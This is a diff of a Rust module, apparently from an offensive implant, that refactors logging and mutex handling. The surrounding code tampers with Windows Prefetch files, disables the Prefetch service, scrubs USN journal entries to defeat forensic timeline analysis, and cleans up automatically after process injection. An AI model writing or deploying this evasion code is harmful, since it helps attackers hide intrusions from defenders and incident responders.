@@ -31,6 +31,7 @@
 // FSCTL_WRITE_USN_CLOSE to close them cleanly, preventing forensic
 // timeline analysis from recovering the modification event.
 
+use common::lock::MutexExt;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::OnceLock;
 
@@ -1041,7 +1042,7 @@ fn patch_pf_header(data: &mut [u8], version: u32) -> Result<(), String> {
             data[rc_off + 3],
         ]);
         if current_rc > 10000 {
-            log::warn!(
+            tracing::warn!(
                 "prefetch: run count at offset {:#x} looks invalid ({}) for version {}, skipping",
                 rc_off,
                 current_rc,
@@ -1067,7 +1068,7 @@ fn patch_pf_header(data: &mut [u8], version: u32) -> Result<(), String> {
             data[ts_off + 7],
         ]);
         if ts_val != 0 && (ts_val < 125911584000000000 || ts_val > 492384576000000000) {
-            log::warn!(
+            tracing::warn!(
                 "prefetch: timestamp at offset {:#x} looks invalid ({}) for version {}, skipping",
                 ts_off,
                 ts_val,
@@ -1099,7 +1100,7 @@ fn patch_pf_header(data: &mut [u8], version: u32) -> Result<(), String> {
         data[name_off..zero_end].copy_from_slice(&vec![0u8; zero_end - name_off]);
     }
 
-    log::debug!(
+    tracing::debug!(
         "prefetch: patched PF header (version={}, run_count_off={:#x}, ts_off={:#x}, name_off={:#x})",
         version, rc_off, ts_off, name_off
     );
@@ -1170,7 +1171,7 @@ unsafe fn clean_usn_for_pf(pf_path: &[u16], volume_letter: &str) -> Result<(), S
 
     if status != STATUS_SUCCESS {
         // Non-fatal: USN cleanup is best-effort.
-        log::warn!(
+        tracing::warn!(
             "prefetch: could not open volume for USN cleanup: NTSTATUS {:#010X}",
             status as u32
         );
@@ -1182,7 +1183,7 @@ unsafe fn clean_usn_for_pf(pf_path: &[u16], volume_letter: &str) -> Result<(), S
     let journal_id = match query_usn_journal_id(handle) {
         Ok(id) => id,
         Err(e) => {
-            log::debug!(
+            tracing::debug!(
                 "prefetch: could not query USN journal ID on {}: {}",
                 volume_letter,
                 e
@@ -1243,7 +1244,7 @@ unsafe fn clean_usn_for_pf(pf_path: &[u16], volume_letter: &str) -> Result<(), S
 
         if read_status != STATUS_SUCCESS {
             // Non-fatal.
-            log::debug!(
+            tracing::debug!(
                 "prefetch: USN journal read returned NTSTATUS {:#010X}",
                 read_status as u32
             );
@@ -1367,7 +1368,7 @@ unsafe fn clean_usn_for_pf(pf_path: &[u16], volume_letter: &str) -> Result<(), S
 
     let _ = nt_close(handle);
 
-    log::debug!(
+    tracing::debug!(
         "prefetch: USN journal cleanup found {} matching entries",
         usn_entries_found
     );
@@ -1412,7 +1413,7 @@ unsafe fn patch_pf_file(pf_nt_path: &[u16]) -> Result<(), String> {
     // Patch the header.
     patch_pf_header(data, version)?;
 
-    log::info!(
+    tracing::info!(
         "prefetch: patched PF file {} (version={}, size={})",
         wide_to_string(pf_nt_path),
         version,
@@ -1443,7 +1444,7 @@ unsafe fn disable_prefetch_service() -> Result<u32, String> {
     }
 
     let _ = nt_close(key_handle);
-    log::info!(
+    tracing::info!(
         "prefetch: disabled Prefetch service (was {})",
         current_value
     );
@@ -1463,7 +1464,7 @@ unsafe fn restore_prefetch_service(value: u32) -> Result<(), String> {
     }
 
     let _ = nt_close(key_handle);
-    log::info!("prefetch: restored Prefetch service to {}", value);
+    tracing::info!("prefetch: restored Prefetch service to {}", value);
     Ok(())
 }
 
@@ -1483,7 +1484,7 @@ fn build_pf_nt_path(filename_wide: &[u16]) -> Vec<u16> {
 /// Called once during agent startup.
 pub fn init_from_config(config: &PrefetchConfig) {
     if !config.enabled {
-        log::debug!("prefetch: module disabled by config");
+        tracing::debug!("prefetch: module disabled by config");
         return;
     }
 
@@ -1496,7 +1497,7 @@ pub fn init_from_config(config: &PrefetchConfig) {
     });
 
     INITIALIZED.store(true, Ordering::SeqCst);
-    log::info!(
+    tracing::info!(
         "prefetch: initialised (method={:?}, auto_clean={}, usn_cleanup={})",
         config.method,
         config.auto_clean_after_injection,
@@ -1530,7 +1531,7 @@ pub fn clean_prefetch(exe_name: &str) -> Result<String, String> {
     if config.method == PrefetchCleanMethod::DisableService {
         match unsafe { disable_prefetch_service() } {
             Ok(old_val) => {
-                let mut saved = SAVED_PREFETCHER_VALUE.lock().unwrap();
+                let mut saved = SAVED_PREFETCHER_VALUE.lock_recover();
                 *saved = Some(old_val);
                 summary.push_str(&format!("Disabled Prefetch service (was {}). ", old_val));
             }
@@ -1591,18 +1592,18 @@ pub fn clean_prefetch(exe_name: &str) -> Result<String, String> {
         match result {
             Ok(()) => {
                 cleaned_count += 1;
-                log::info!("prefetch: cleaned {} ({:?})", filename, config.method);
+                tracing::info!("prefetch: cleaned {} ({:?})", filename, config.method);
             }
             Err(e) => {
                 errors.push(format!("{}: {}", filename, e));
-                log::warn!("prefetch: failed to clean {}: {}", filename, e);
+                tracing::warn!("prefetch: failed to clean {}: {}", filename, e);
             }
         }
 
         // USN journal cleanup.
         if config.clean_usn_journal {
             if let Err(e) = unsafe { clean_usn_for_pf(&pf_path, "C:") } {
-                log::debug!("prefetch: USN cleanup failed for {}: {}", filename, e);
+                tracing::debug!("prefetch: USN cleanup failed for {}: {}", filename, e);
                 // Non-fatal — best effort.
             }
         }
@@ -1610,7 +1611,7 @@ pub fn clean_prefetch(exe_name: &str) -> Result<String, String> {
 
     // Restore the Prefetch service if we disabled it.
     if config.method == PrefetchCleanMethod::DisableService && config.restore_service_after {
-        let saved = SAVED_PREFETCHER_VALUE.lock().unwrap();
+        let saved = SAVED_PREFETCHER_VALUE.lock_recover();
         if let Some(old_val) = *saved {
             drop(saved);
             if let Err(e) = unsafe { restore_prefetch_service(old_val) } {
@@ -1652,7 +1653,7 @@ pub fn disable_prefetch() -> Result<String, String> {
 
     match unsafe { disable_prefetch_service() } {
         Ok(old_val) => {
-            let mut saved = SAVED_PREFETCHER_VALUE.lock().unwrap();
+            let mut saved = SAVED_PREFETCHER_VALUE.lock_recover();
             *saved = Some(old_val);
             Ok(format!(
                 "Prefetch service disabled (EnablePrefetcher was {})",
@@ -1669,7 +1670,7 @@ pub fn restore_prefetch() -> Result<String, String> {
         return Err("Prefetch cleanup module not initialised".to_string());
     }
 
-    let mut saved = SAVED_PREFETCHER_VALUE.lock().unwrap();
+    let mut saved = SAVED_PREFETCHER_VALUE.lock_recover();
     match *saved {
         Some(old_val) => {
             *saved = None;
@@ -1712,14 +1713,14 @@ pub fn auto_clean_after_injection(process_name: &str) {
         .next()
         .unwrap_or(process_name);
 
-    log::info!(
+    tracing::info!(
         "prefetch: auto-cleanup triggered for injected process '{}'",
         exe_name
     );
 
     match clean_prefetch(exe_name) {
-        Ok(summary) => log::info!("prefetch: auto-cleanup result: {}", summary),
-        Err(e) => log::warn!("prefetch: auto-cleanup failed: {}", e),
+        Ok(summary) => tracing::info!("prefetch: auto-cleanup result: {}", summary),
+        Err(e) => tracing::warn!("prefetch: auto-cleanup failed: {}", e),
     }
 }
 
@@ -1733,20 +1734,20 @@ pub fn shutdown() {
     let config = CONFIG.get();
     if let Some(c) = config {
         if c.restore_service_after {
-            let mut saved = SAVED_PREFETCHER_VALUE.lock().unwrap();
+            let mut saved = SAVED_PREFETCHER_VALUE.lock_recover();
             if let Some(old_val) = *saved {
                 *saved = None;
                 drop(saved);
                 match unsafe { restore_prefetch_service(old_val) } {
-                    Ok(()) => log::info!("prefetch: restored Prefetch service on shutdown"),
-                    Err(e) => log::warn!("prefetch: failed to restore service on shutdown: {}", e),
+                    Ok(()) => tracing::info!("prefetch: restored Prefetch service on shutdown"),
+                    Err(e) => tracing::warn!("prefetch: failed to restore service on shutdown: {}", e),
                 }
             }
         }
     }
 
     INITIALIZED.store(false, Ordering::SeqCst);
-    log::info!("prefetch: module shut down");
+    tracing::info!("prefetch: module shut down");
 }
 
 // ── Tests ────────────────────────────────────────────────────────────────
